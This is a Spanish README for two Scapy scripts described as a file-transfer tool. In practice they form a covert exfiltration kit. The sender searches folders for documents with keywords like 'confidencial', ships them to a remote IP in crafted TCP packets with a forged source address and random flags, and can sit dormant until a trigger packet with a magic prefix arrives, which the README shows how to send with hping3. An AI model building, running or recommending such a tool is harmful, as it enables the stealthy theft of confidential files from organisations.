# Transferencia de Archivos a través de capa de transporte TCP

Este proyecto contiene dos scripts en Python (sender.py y receiver.py) para la transferencia de archivos a través de la red utilizando paquetes TCP. El objetivo principal de estos scripts es permitir la búsqueda de archivos que contengan ciertas palabras clave y enviarlos a través de la red a una máquina destino. El proceso de envío y recepción se maneja mediante paquetes TCP personalizados utilizando la librería Scapy.

## Características
1-. **sender.py**: Permite buscar archivos en un directorio local que contengan ciertas palabras clave y enviarlos a una máquina destino a través de la red.

2-. **receiver.py**: Escucha en una interfaz de red para recibir los paquetes enviados por sender.py y reconstruir el archivo recibido.

## Requisitos
- Python 3.x
- Librerías necesarias:
  - scapy
  - PyPDF2
  - python-docx
  - xlrd
  - openpyxl
  - python-pptx
    
Puedes instalar las librerías necesarias ejecutando:
```
pip install scapy PyPDF2 python-docx xlrd openpyxl python-pptx
```

## Uso sender.py
  El script sender.py tiene dos modos de operación:
  
  ### Modo searchAndSend
  Busca archivos en un directorio especificado por palabras clave y los envía a una máquina destino.
    
  #### Ejemplo de uso:
  ```
  python3 sender.py searchAndSend --rootPath <directorio_raiz> --keywords <palabra1,palabra2> --destinationIp <IP_destino> --tcpFlag <flag_tcp>
  ```

  #### Argumentos:
  - **--rootPath**: Ruta del directorio donde comenzar a buscar archivos.
  - **--keywords**: Palabras clave que se buscarán en los archivos. Separadas por comas.
  - **--destinationIp**: Dirección IP del receptor (máquina destino).
  - **--destinationPort**: Puerto de destino (por defecto 80).
  - **--sourceIp**: Dirección IP de origen (por defecto 10.1.0.10).
  - **--sourcePort**: Puerto de origen (por defecto 12345).
  - **--tcpFlag**: Flag del protocolo TCP. Puede ser uno de los siguientes: S, A, P, F, R, U, SA, FA, SF o random.

  #### Ejemplo:
  ```
  python3 sender.py searchAndSend --rootPath ./NAS --keywords confidencial --destinationIp 192.168.1.100 --tcpFlag random
  ```

  ### Modo waitForOrder
  Este modo espera recibir un comando de red para iniciar el envío de archivos. Una vez que el comando es recibido, sender.py buscará y enviará los archivos a la máquina destino.

  #### Ejemplo de uso:
  ```
  python3 sender.py waitForOrder
  ```
  Este comando pone al script en espera de recibir paquetes que contengan la información necesaria para realizar el envío de archivos. El paquete de activación debe comenzar por "1j2k3l4m" seguido de:
  
  - Valor del directorio raiz
  - Palabras clave
  - Dirección ip destino
  - Flag TCP

  Cada valor debe ir separado por "|"
  La cadena inicial "1j2k3l4m" sirve para identificar el paquete que activa el proceso. Se debe ajustar el parámetro -d con la longitud del string.

  #### Ejemplo
  ```
  1j2k3l4m./NAS|seguridad|192.168.1.11|S
  1j2k3l4m/home/user/Documents|planos|10.0.1.11|random
  1j2k3l4m/home/user/Documents|confidencial|198.51.100.12|F
  ```
  Puedes utilizar hping3 para realizar una prueba en la activación del proceso.
  ```
  echo -n "1j2k3l4m./NAS|seguridad|192.168.1.11|S" | sudo hping3 -S -p 80 -s 12345 -d 38 -E /dev/stdin 192.168.1.100
  ```

## Uso receiver.py
  El script receiver.py se utiliza para recibir los paquetes enviados por sender.py, reconstruir los archivos y guardarlos localmente. Solo se necesita ejecutar este script en la máquina que recibirá los archivos.

  #### Ejemplo de uso:
  ```
  python3 receiver.py
  ```
  El script comenzará a escuchar en la interfaz de red especificada (por defecto eth0) para recibir los paquetes y guardar los archivos en el directorio ./OUTPUT.
  
  ### Detalles de funcionamiento

  - **Envío de paquetes**: Los archivos se envían como fragmentos de paquetes TCP que se envían utilizando la librería Scapy. Cada fragmento incluye un identificador único ("magic") para asegurar que los paquetes sean correctamente reconocidos y procesados.

  - **Recepción de archivos**: El script receiver.py escucha los paquetes entrantes y va reconstruyendo el archivo a medida que recibe los fragmentos. Al finalizar la transferencia, el archivo es guardado en el directorio ./OUTPUT.

  #### Formatos de archivo soportados:
  - PDF
  - DOCX
  - TXT
  - XSL
  - XLSX
  - ODT

  Estos formatos son procesados para extraer su contenido y buscar las palabras clave.

## Seguridad
  - **ARP Spoofing**: Para evitar la resolución ARP (Address Resolution Protocol), la variable conf.arp_resolve está configurada a False en el script sender.py, lo que evita que se realicen consultas ARP durante el envío de paquetes.
  - **Dirección MAC estática**: La dirección MAC de destino está hardcodeada en el script como 00:11:22:33:44:55, lo cual podría ser necesario ajustarlo si se utiliza una red diferente.

## Contribuciones
Si deseas contribuir a este proyecto, por favor, realiza un fork del repositorio, realiza tus cambios y abre un pull request con una descripción detallada de las modificaciones.
